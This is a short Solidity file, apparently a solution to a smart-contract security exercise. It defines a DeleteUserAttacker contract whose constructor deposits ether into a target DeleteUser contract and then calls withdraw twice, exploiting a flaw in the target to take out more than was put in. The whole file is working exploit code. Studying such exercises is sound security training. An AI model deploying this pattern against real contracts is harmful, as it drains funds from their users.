//SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

import "../DeleteUser.sol";

contract DeleteUserAttacker {
    DeleteUser public victimContract;
    uint recursionCount = 0;

    constructor(address _victimContract) payable {
        // need to perform attack here since only 1 tx needed
        victimContract = DeleteUser(_victimContract);
        victimContract.deposit{value: msg.value}();
        victimContract.deposit();
        victimContract.withdraw(1);
        victimContract.withdraw(1);
    }
}
